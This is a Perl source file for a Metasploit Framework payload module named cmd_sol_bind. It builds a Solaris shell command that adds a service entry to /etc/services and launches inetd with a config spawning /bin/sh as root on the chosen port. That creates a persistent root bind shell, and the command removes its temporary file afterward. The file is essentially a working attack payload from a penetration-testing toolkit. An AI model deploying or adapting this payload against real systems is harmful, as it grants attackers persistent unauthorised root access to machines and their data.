package Msf::Payload::cmd_sol_bind;
use strict;
use base 'Msf::PayloadComponent::CommandPayload';
sub load {
  Msf::PayloadComponent::CommandPayload->import('Msf::PayloadComponent::BindConnection');
}

my $info =
{
  'Name'         => 'cmd_sol_bind',
  'Version'      => '$Revision$',
  'Description'  => 'Use inetd to create a persistent bindshell',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
  'Arch'         => [  ],
  'Priv'         => 0,
  'OS'           => [ 'solaris' ],
  'Keys'         => ['cmd'], 
  'Size'         => '',
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub CommandString {
  my $self = shift;
  my $port = $self->GetVar('LPORT');

  my $command =
  "grep -v msfbind /etc/services>/tmp/.msf_svcs;".
  "echo msfbind $port/tcp>>/tmp/.msf_svcs;".
  "cp /tmp/.msf_svcs /etc/services;".
  "echo msfbind stream tcp nowait root /bin/sh sh>/tmp/.msf_inet;".
  "/usr/sbin/inetd -s /tmp/.msf_inet;".
  "rm /tmp/.msf_inet;";

  return($command);
}
